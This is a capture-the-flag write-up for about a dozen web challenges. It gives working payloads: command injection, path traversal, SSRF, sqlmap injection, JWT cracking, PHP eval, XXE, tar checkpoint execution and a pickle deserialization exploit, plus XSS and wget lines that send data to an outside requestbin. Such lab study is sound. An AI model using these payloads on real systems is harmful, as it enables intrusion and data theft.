# pentest

1. Ping Station:

Steps and Logic:
Through testing input options by adding a command to a valid input we find out that input has vulnerability – we can run commands through it as long as command starts with a valid, acceptable-for-the-system input; in this case, that input is a valid IP address (you can change 1.1.1.1 for any other valid IP address). We can test this vulnerability by entering ’1.1.1.1; ls’ for example and see the contents of the current directory.

Through this we learn that in the current directory there is a file named ‘flag’ which we output to the page using ‘cat flag’ command.

BASICALLY PUT 1.1.1.1; cat flag in the insert IP space

Flag:
ECSC{b1c0bc8e5e1b4c81199ad3c41bef8b69bea3ab86ecfb08c211d90ace0ff98df3}


2. File Crawler:
   
   Steps and Logic:
Based on the hint: “The flag is located in a temporary folder” we can start looking for a temporary folder in the files. We can try a couple of different ‘levels’(so ./tmp.flag, etc.) – in the same folder, in parent folder, etc. We use two slashes because of slash filtering, so one ‘/’ will not work, but ‘//’ will because the second slash will bypass the filter.
From inspecting the initial page we can see the arguments in the url
We can change the url for the path we’re interested in, so -> .//tmp/flag.

BASICALLY Enter: ‘ /local?image_name=.//tmp/flag ’ after the address
File containing the flag is automatically downloaded

additional steps that i did: Then I changed the url http://34.107.26.201:30513/local?image_name=static/path.jpg into http://34.107.26.201:30513/local?image_name=app.py to see the python code of the file
With the etc/password I downloaded a file which showed information stored about the users on the system
Finally I used ..tmp/flag to find the flag which was:
CTF{0caec419d3ad1e1f052f06bae84d9106b77d166aae899c6dbe1355d10a4ba854}


3. Alien inclusion

   I opened Linux on VMWare and first checked if I had curl function installed and then went with the command curl -X POST "http://34.107.26.201:30640/?start=" --data "start=/var/www/html/flag.php", to find my flag.
The command curl -X POST "http://34.107.26.201:30640/?start=" --data "start=/var/www/html/flag.php" sends a POST request to a web server. It aims to include and execute the flag.php file on the server by setting the start parameter to its path. This is used to retrieve the hidden flag for the CTF challenge. 
And as expected the command gave us the flag:
ctf{b513ef6d1a5735810bca608be42bda8ef28840ee458df4a3508d25e4b706134d}


Steps and Logic:
Based on the logic given on the landing page we can see what condition we need met: we should definitely be getting ‘start’ parameter in a request, so in our trials we will take that into account. So when we start using Curl to send a post request, we are making sure to set the ‘start’ to the file we want to see and also include it in the url. As we can see from the landing page and by using the inspect tool, the page uses php – hence the file extension for ‘flag.php’.

4. Ultra Crawl

   In BurpSuite turn on intercept, go to provided url and send the request to repeater. Change the Host to ‘ company.tld ’ and add line ‘ url=file:///home/ctf/app.py ’. Send the request. In the response you will see the flag. or tru ... :////home ...
Flag:
ctf{d8b7e522b0ab04101e78ab1c6ff68c4cb2f30ce9d4427d4cd77bc19238367933}

Steps and Logic:
Through testing we can see that we can access different files via input for example: file:///etc/passwd is valid
We can see that there is a home/ctf directory. There should also most likely be a startup bash script named ‘start.sh’ and through checking this suspicion is proven correct.
Then we go on to check the ‘app.py’ file
After brief analysis we know what parameters need to be set in POST request to get the flag and we can move to BurpSuite and send the request accordingly – making sure to set the Host to ‘company.tld’ as that is an important condition. The following request returns desired response

5. Substitute

   Add to the address: ‘ /?vector=/Admin/e&replace=system(‘cat here_we_dont_have_flag/flag.txt’) ’

   Flag:
CTF{92b435bcd2f70aa18c38cee7749583d0adf178b2507222cf1c49ec95bd39054c}

Steps and Logic:
Upon inspecting the logic given on the landing page, we know that we need to set ‘Vector’ parameter AND the ‘replace’ parameter for the initial Admin-swapping to work -> ‘?vector=/Admin/&replace=User’ – adding this to the url, for example, will replace ’Admin’ on the page with ‘User’. Following the same logic, we can check what is in the current directory by running the following command : /?vector=/Admin/e&replace=system(‘ls’)
Through this, we learn the name ‘here_we_dont_have_flag index.php’ 
in which we later locate flag.txt.

      6. under-construction
http://34.89.138.139:30167/
I used login and it shows us the credentials and account info
Since I am just a user for more information im going to change my role to role admin from storage
After this admin board appears in navbar
But it still wont let us fully access it
Now im going to take accesstoken
Go to jwt.io and insert it in the main input, change id to 1 since it takes more priority and in the secret
code we put letmein
Now we take the generated token and insert it instead of the old one. Now in the admin board we see
this:
Our flag is:
CTF{b566bdee4836bbb0bdfb9aff931d7f061b67db0e9cf3859f246261d0acc35
438}
   7. downloader v1

1. Firstly we test the site and check the results: and as the result says it uses
wget parameter so we can use –post-file
We see in inspect that we have flag.php but unfortunatley we cant open it:
The thing we can do it to open requestbin because it actually cab download
files so what if we try to give it flag.php parameter?
And on requestbin, after we use post request we can see flag:



1.	ping-station;
we can disguise command with an ip by sending 1.1.1.1; ls we seem to have some sort of dictionaries here. So we can use cat command to see what’s in the dictionary 
1.1.1.1; cat flag will load the flag

2.	small data leak
Follow instructions in description and open the webaddress/user?id= we see there is an error this should be vulnerable to sql injection. The first command shoudl identify the injection point: sqlmap -u webaddress/user?id=1 Once the injection point has been identified, I simply enumerated the databases: sqlmap -u webaddress/user?id=1 –dbs, The first part of the flag could be found in ‘public’ database’s list of tables: sqlmap -u webaddress/user?id=1 -D public –tables The last part of the flag was the name of a column inside the table that is named after the first part of the flag: sqlmap -u webaddress/user?id=1 -D public -T 'ctf{70ff919c37a20d6526b02e88c950271a45fa698b037e3fb898ca68295da' --columns

3.	file-crawler;
open page go to inspect open picture in another tab, change address to webaddress/local?image_name=tmp, it doesn’t work because The site is filtering the input to overcome this we can add extra elements that can be filtered but not change our request in process: webaddress/local?image_name=..//..//..//..//tmp/flag it will download the flag

4.	ultra-crawl;
open website try to crawl into file:///etc/passwd witch is the file that stores essential information about user account in it we will find dictionary home/ctf witch contains app.py file try to crawl to it using file:///home/ctf/app.py here we seen the condition that allows us to access flag now set up proxy using burp change host to company.tld and send it, it should return flag

5.	alien-inclusion;
First we go to given link see that it is a code written in php, after reading it we find that we need to access this website using specific request to get the flag. Use following command in terminal: curl 'webaddress /?start=true' -X POST -d 'start=flag.php'

6.	substitute;
chellenge asks us to replace admin so lets try to do so by changing url 
change url to http://webaddress/?vector=/Admin/e&replace=system(%ls%27) we found the file here_we_dont_have_flag let’s extract it using following command
http://webaddress/?vector=/Admin/e&replace=system(%27cat%20here_we_dont_have_flag/flag.txt%27)

7.	under-construction;
create an account enter it then inspect  the page go to sources and js files we see an app file use following url to see how to get an admin role webaddress/js/app.d875ddd5.js.map, once on the page search up admin to see how admin role is formatted once found go back to the homepage and into application change to admin role to gain admin privileges now we need jwt tool if you don’t have it clone it from github  go to cd jwt_tool and open jwt.io website now execute following commed : python3 jwt_tool.py -t webaddress -rc " jwt.io code " -C -d rockyou.txt (locate rockyou.txt – to locate file , sudo gunzip /usr/share/wordlists/rockyou.txt.gz – to unzip ) the password will be letmein go back to jwt.io and insert it as a sectert code and change is to 1 as ADMIN is usually id 1 we got a new secret token that we then enter into user storage Once we change token and refresh the website we will see out flag

8.	downloader-v1;
open the task we see a link downloader with placeholder, inspect the page here we
see flag.php that we seemingly need to extract for that we will use request bin that we
can create in website pipedream, create a requestbin it will  give the link to our specific request bin, enter in the downloader in following format : yourlink/test.php --post-file '/var/www/html/flag.php' , After witch pipedream will catch the request and show us the flag in body

9.	 frameble;
When we open lab, we see a log In page first thing we do is register on the website and login,
we see a dashboard where we can post things for the admin to review This form on the portal is potentially vulnerable to XSS attacks. go to pipedream and create request bin then we create the post with following
<script>
var exfil = document.getElementsByTagName("body")[0].innerHTML;
window.location.href = "yourlink?pgsrc=" + btoa(exfil);
</script>
in requestbin it’ll send hex that will need decoding it won’t be properly formatted so you can use word’s find replace function to replace empty space with + and then decode it using terminal or online base64 decoder

10.	manual-review;
this like two before is XSS valnurability  task after reistering you can leave a messege for admin : <script>window.location.href="yourlink/hello";</script> after submitting flag should be sent to  your request bin 

11.	syntax check
The trick was to figure out that you had to send something in the request body instead of a GET parameter. curl -D- -XGET 'http://34.107.22.248:30526/parse' --data test, It got an error message, Now we get a clue that the data we send is should be XML. The vulnerability here must be XML External Entity processing. We can try to create some entities that fetches local files on the server.
$ curl -D- -XGET 'http://34.107.22.248:30526/parse' --data '<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY exfiltrate SYSTEM "/etc/passwd">
]>
<foo>&exfiltrate;</foo>'
We get the /etc/passwd file back!

However we cannot leak the flag using base64 encoding.

curl -D- -XGET 'http://34.107.22.248:30526/parse' --data '<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY exfiltrate SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/flag">
]>
<foo>&exfiltrate;</foo>'
The error message is You just tried to exfiltrate using base64? Nice. Try again! Seems like there is some sort of filter checking the output. We can't convert the PHP flag file into base64. It is still possible to convert the PHP file into UTF-16 though
$ curl -D- -XGET 'http://34.107.22.248:30526/parse' --data '<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY exfiltrate SYSTEM "php://filter/convert.iconv.utf-16le.utf-8/resource=/var/www/html/flag">
]>
<foo>&exfiltrate;</foo>'
We then get this string - 瑣筦㈰摢㠴㈶㌷㈰㌶㈶㡥㙡㘹挱㍤〳㠳㈱㜰挳〵慦㔷戹㈴戰攱愷ㄱ㉡㍣扡㄰〳੽
I ran following script in python to decode
encoded_string = "瑣筦㈰摢㠴㈶㌷㈰㌶㈶㡥㙡㘹挱㍤〳㠳㈱㜰挳〵慦㔷戹㈴戰攱愷ㄱ㉡㍣扡㄰〳੽"
decoded_string = encoded_string.encode('utf-16', errors='ignore').decode('utf-8', errors='ignore')
print(decoded_string)

12.	tartarsausage;
open the website and inspect it, The source code of the index page revealed a ‘secret’ page
enter it into url: webaddress/sadjwjaskdkwkasjdkwasdasdas.html tar is a linux tool for extracting files it can be used to  break out from restricted environments by spawning an interactive system shell. Use following command: -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec="ls -lah" we are going to see dictionaries now The directory with a very long name contained a file named ‘flag’ that contained the flag. Use curl to extract it by command : curl webaddress/enhjenhzZGN3YWRzYWRhc2Rhc3NhY2FzY2FzY2FzY2FjYWNzZHNhY2FzY2Fzc2FjY2Fz/flag

13.	rundown
we need to make  a POST request with curl, saving the output to a file, and opening that file with my browser use following commands : curl -X POST webaddress/ > a.html and open it by firefox a.html The new output offeres a lot of information. the web app is powered by Flask. The server’s  using python 2.7 and a part of the app.py file’s visible in the traceback, to solve it we need to use pickle so create python code tha will loo like this 
import _pickle as cPickle
import base64
import os
import string
import requests
import time

class Exploit(object):
	def __reduce__(self):
		return (eval, ('eval(open("flag","r").read())', ))

def sendPayload(p):
	newp = base64.urlsafe_b64encode(p).decode()
	headers = {'Content-Type': 'application/yakoo'}
	r = requests.post("webaddress/",headers=headers,data=newp)
	return r.text


payload_dec = cPickle.dumps(Exploit(), protocol=2)
print("ctf{" + sendPayload(payload_dec).split("ctf{")[1].split("}")[0] + "}")
run the code it should show the flag





